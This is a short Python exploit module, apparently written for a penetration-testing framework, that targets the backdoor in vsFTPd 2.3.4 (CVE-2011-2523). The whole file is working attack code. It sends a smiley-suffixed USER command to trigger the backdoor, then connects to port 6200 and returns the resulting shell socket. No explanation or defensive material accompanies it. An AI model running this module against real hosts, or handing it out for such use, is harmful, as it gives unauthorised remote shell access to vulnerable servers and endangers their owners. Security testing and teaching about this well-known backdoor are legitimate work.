import socket
import time

from module import Type, Module


class VsFTPd(Module):

    def __init__(self):
        super().__init__("vsftpd_backdoor",
                         ["vsftpd", "backdoor", "rce", "2.3.4", "cve-2011-2523	"],
                         "vsftpd backdoor")

        self.add_option("RHOST", "target host", required=True, type=Type.host)
        self.add_option("RPORT", "target port", required=True, default=21, type=Type.int)
        self.add_option("TIMEOUT", "timeout", required=True, default=5, type=Type.int)

    def run(self):
        ip = socket.gethostbyname(self.rhost)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                s.connect((ip, self.rport))
                s.send(b'USER letmein:)\n')
                s.send(b'PASS NOW\n')
                time.sleep(3)
                print("[+] triggered backdoor")
        except (ConnectionRefusedError, TimeoutError):
            print("[-] failed to trigger the backdoor")
            return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((ip, 6200))
            print("[+] successfully connected")
            return s, (ip, 6200)
        except (ConnectionRefusedError, TimeoutError):
            print("[-] failed to connect to backdoor")
